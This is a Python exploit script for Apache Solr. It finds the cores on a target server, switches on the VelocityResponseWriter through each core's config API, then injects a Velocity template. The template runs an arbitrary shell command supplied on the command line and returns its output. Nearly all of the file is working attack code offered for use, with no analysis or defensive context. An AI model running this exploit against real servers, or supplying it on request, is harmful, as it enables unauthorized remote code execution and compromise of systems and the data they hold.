#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Author:gshell

import sys
import os
import requests
import json

auth = """
   ___               _____        __         __   __
  / _ )  __ __      / ___/  ___  / /  ___   / /  / /
 / _  | / // /     / (_ /  (_-< / _ \/ -_) / /  / / 
/____/  \_, /      \___/  /___//_//_/\__/ /_/  /_/  
       /___/
====================================================

"""

def get_core_name(url):
    if url[-1] == '/':
        url = url[:-1].split('\n')[0]
    else:
        url = url.split('\n')[0]
    print ('[+] target_url： {}'.format(url))
    cores_url = url + '/solr/admin/cores?indexInfo=false&wt=json'
    print ('[+] Cores_Name： {}\n'.format(cores_url))
    print ('====================================================')

    r = requests.get(cores_url)
    if r.status_code == 200 and 'responseHeader' in r.text and 'status' in r.text:
        json_str = json.loads(r.text)

        for key in json_str['status']:
            core_name_url = url + '/solr/' + key + '/config'
            exploit(core_name_url)
        
    else:
        print("no core_name, try to create please")

def exploit(url):
    solr_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0", 
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", 
    "Accept-Encoding": "gzip, deflate", 
    "Connection": "close", 
    "Upgrade-Insecure-Requests": "1", 
    "Cache-Control": "max-age=0", 
    "Content-Type": "application/json"
    }

    solr_json = {"update-queryresponsewriter": {"class": "solr.VelocityResponseWriter", 
    "name": "velocity", 
    "params.resource.loader.enabled": "true", 
    "solr.resource.loader.enabled": "true", 
    "startup": "lazy", 
    "template.base.dir": ""}}
    # proxies = {"http":"http://127.0.0.1:8080"}
    r = requests.post(url, headers=solr_headers, json=solr_json)
    if r.status_code == 200 and 'responseHeader' in r.text:
        print("[+] target maybe vulnerable!")
        solr_url = url[:-7]
        # print(solr_url)
        cmd = sys.argv[2]
        solr_exp(solr_url,cmd)
    else:
        print ("[+] target is not vulnerable\n")

def solr_exp(url,cmd):
    url = url + r"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + cmd + r"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    r = requests.get(url)
    if r.status_code == 400 or r.status_code == 500  or r.status_code ==200 and len(r.content) >0:
        print ("[+] solr_rce exploit Successful!")
        print ('\nvulnerable url： {}'.format(url))
        print ('\nsolr__response： {}'.format(r.text))
        print ('====================================================\n')
    else:
        print ("!!! [+] solr exploit failed! !!!")

if __name__ == '__main__':
    print(auth)
    if len(sys.argv) != 3:
        sys.exit("\n [!] Usage:  python3 %s url cmd\n" % sys.argv[0])
    else:
        url = sys.argv[1]
        get_core_name(url)